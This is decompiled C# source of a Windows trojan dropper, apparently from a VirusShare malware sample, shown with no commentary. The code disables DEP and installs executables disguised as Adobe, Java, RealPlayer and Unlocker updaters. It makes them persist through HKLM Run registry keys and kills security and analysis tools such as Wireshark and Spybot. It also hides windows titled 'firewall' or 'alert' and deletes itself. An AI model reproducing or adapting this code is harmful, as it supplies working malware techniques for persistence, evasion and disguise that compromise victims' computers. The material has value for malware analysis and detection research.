// Decompiled with JetBrains decompiler
// Type: Pack.Module1
// Assembly: Pack, Version=9.16.0.0, Culture=neutral, PublicKeyToken=null
// MVID: ACC64295-51A1-4C26-98C5-8E2F69829C2D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Trojan.MSIL.EvilPack.a-fb9e70160468391f2e409f90855603cc1eba6ef22214692fdd84fd7e9584271c.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Pack.My;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Pack
{
  [StandardModule]
  internal sealed class Module1
  {
    private static string nircmd = "nircmdc.exe";
    private static string ExtraFile = "firefox.exe";

    [STAThread]
    public static void Main()
    {
      Module1.ShellExec(Module1.nircmd + " shellcopy \"~$nir.exefile$\" \"~$folder.system$\" yestoall noerrorui silent", Wait: true, Timeout: 10000);
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(FileSystem.CurDir() + "\\" + Module1.nircmd);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Module1.HideAll();
      Module1.ShellExec("bacdedit /set {current} nx AlwaysOff", Wait: true, Timeout: 10000);
      Module1.TerminateProcess(new string[6]
      {
        "qttask",
        "AdobeARM",
        "jusched",
        "realsched",
        "NeroCheck",
        "Unlocker"
      });
      Module1.CopyFile();
      string[] strArray = new string[4]
      {
        "AdobeARM.exe",
        "jusched.exe",
        "realsched.exe",
        "UnlockerAssistant.exe"
      };
      int index = 0;
      while (index < strArray.Length)
      {
        string str = strArray[index];
        Module1.DeleteFile(FileSystem.CurDir() + "\\" + str);
        checked { ++index; }
      }
      Module1.HideAll();
      string str1 = FileSystem.CurDir() + "\\" + Module1.ExtraFile;
      Module1.ShellExec(Module1.nircmd + " waitprocess \"" + Module1.ExtraFile + "\" cmdwait 5000 filldelete \"" + str1 + "\"");
      string location = Assembly.GetExecutingAssembly().Location;
      int id = Process.GetCurrentProcess().Id;
      Module1.ShellExec(Module1.nircmd + " waitprocess /" + Conversions.ToString(id) + " cmdwait 5000 filldelete \"" + location + "\"");
    }

    public static void CopyFile()
    {
      string source1 = "AdobeARM.exe";
      string dest1 = "~$folder.programfiles$\\Common Files\\Adobe\\ARM\\1.0\\";
      string str1 = "Adobe ARM";
      Module1.CopyFile2(source1, dest1);
      Module1.ShellExec(Module1.nircmd + " regsetval sz \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" \"" + str1 + "\" \"" + dest1 + source1 + "\" ", Wait: true, Timeout: 10000);
      string source2 = "jusched.exe";
      string dest2 = "~$folder.programfiles$\\Common Files\\Java\\Java Update\\";
      string str2 = "SunJavaUpdateSched";
      Module1.CopyFile2(source2, dest2);
      Module1.ShellExec(Module1.nircmd + " regsetval sz \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" \"" + str2 + "\" \"" + dest2 + source2 + "\" ", Wait: true, Timeout: 10000);
      string source3 = "realsched.exe";
      string dest3 = "~$folder.programfiles$\\Common Files\\Real\\Update_OB\\";
      string str3 = "TkBellExe";
      Module1.CopyFile2(source3, dest3);
      Module1.ShellExec(Module1.nircmd + " regsetval sz \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" \"" + str3 + "\" \"" + dest3 + source3 + "\" ", Wait: true, Timeout: 10000);
      string source4 = "UnlockerAssistant.exe";
      string dest4 = "~$folder.programfiles$\\Unlocker\\";
      string str4 = "UnlockerAssistant";
      Module1.CopyFile2(source4, dest4);
      Module1.ShellExec(Module1.nircmd + " regsetval sz \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" \"" + str4 + "\" \"" + dest4 + source4 + "\" ", Wait: true, Timeout: 10000);
    }

    public static void CopyFile2(string source, string dest)
    {
      Module1.ShellExec(Module1.nircmd + " execmd attrib -h -r -s \"" + dest + "*.*\" ", Wait: true, Timeout: 10000);
      Module1.ShellExec(Module1.nircmd + " shellcopy \"" + source + "\" \"" + dest + "\" yestoall noerrorui silent", Wait: true, Timeout: 10000);
      Module1.ShellExec(Module1.nircmd + " execmd attrib +r +s \"" + dest + source + "\" ", Wait: true, Timeout: 10000);
    }

    public static void DeleteFile(string filepath) => Module1.ShellExec(Module1.nircmd + " filldelete \"" + filepath + "\" ", Wait: true, Timeout: 10000);

    public static void HideAll()
    {
      Module1.TerminateProcess(new string[7]
      {
        "malware",
        "wireshark",
        "beattrojan",
        "dw20",
        "werfault",
        "ntvdm",
        "spybot"
      });
      Module1.HideWin(new string[12]
      {
        "0.0.0",
        "exe -",
        "錯誤",
        "javaw.exe",
        "java.exe",
        "winlogon",
        "explorer",
        "qttask",
        "application",
        "debug",
        "firewall",
        "alert"
      });
    }

    public static void ShellExec(string PathName, AppWinStyle style = AppWinStyle.Hide, bool Wait = false, int Timeout = -1)
    {
      try
      {
        Interaction.Shell(PathName, style, Wait, Timeout);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static object HideWin(string[] Titles)
    {
      if (!new FileInfo(Module1.nircmd).Exists)
        return (object) false;
      string[] strArray = Titles;
      int index = 0;
      while (index < strArray.Length)
      {
        string str = strArray[index];
        Module1.ShellExec(Module1.nircmd + " win hide ititle \"" + str + "\" ", Wait: true, Timeout: 10000);
        checked { ++index; }
      }
      return (object) true;
    }

    public static void TerminateProcess(string[] Ps)
    {
      try
      {
        Process[] processes = Process.GetProcesses();
        int index1 = 0;
        while (index1 < processes.Length)
        {
          Process process = processes[index1];
          string[] strArray = Ps;
          int index2 = 0;
          while (index2 < strArray.Length)
          {
            string Left = strArray[index2];
            if (Operators.CompareString(Left, "", false) != 0 & process.ProcessName.ToLower().StartsWith(Left.ToLower()))
              process.Kill();
            checked { ++index2; }
          }
          checked { ++index1; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
